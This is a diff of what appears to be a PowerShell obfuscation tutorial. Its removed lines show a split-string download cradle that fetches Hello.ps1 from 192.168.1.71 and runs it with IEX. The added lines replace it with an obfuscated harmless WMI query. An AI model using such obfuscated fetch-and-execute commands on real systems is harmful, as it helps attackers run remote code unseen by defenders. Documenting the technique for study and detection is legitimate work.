@@ -504,22 +504,22 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-      TODO: [ ScriptBlock -Replace parameter ]
-      Build a variable named $ScriptBlockContents with the 'SPLIT' syscall inside, and use .Replace("+","")
+      [ ScriptBlock -Replace parameter ]
+      Build a variable named $ScriptBlock with the 'SPLIT' syscall inside, and use .Replace("+","")
       to 'de-split' the syscall into a new local variable named $syscall, to be called at run-time.
 
 <br />
 
 - String command to obfuscate<br />
-`(New-Object Net.WebClient).DownloadString('http://192.168.1.71/Hello.ps1')`
+`Win32_OperatingSystem`
 
 - String obfuscated<br />
 
-      $ScriptBlockContents = @"("Ne"+"w-Ob"+"ject Ne"+"t.Web"+"Cli"+"ent").DownloadString(!ht'+'tp:'+'//19'+'2.16'+'8.1'+'.71/Hello.ps1!)"@
-      $syscall = $ScriptBlockContents.Replace("+","").Replace('"','').Replace("'","").Replace("!","'")
-      IEX $syscall
+      $ScriptBlock = "Wi'+'n?32_O'+'p%era'+'ti%n%gS'+'y?st%em"
+      $syscall = $ScriptBlock.Replace("?","").Replace("'","").Replace("+","").Replace("%","")
+      Get-CimInstance $syscall | Select-Object CSName, OSArchitecture, Caption, SystemDirectory | FL *
 
-![powershell obfuscation](http://i.)
+![powershell obfuscation](http://i.cubeupload.com/Ymww0G.jpg)
 
 ---
 
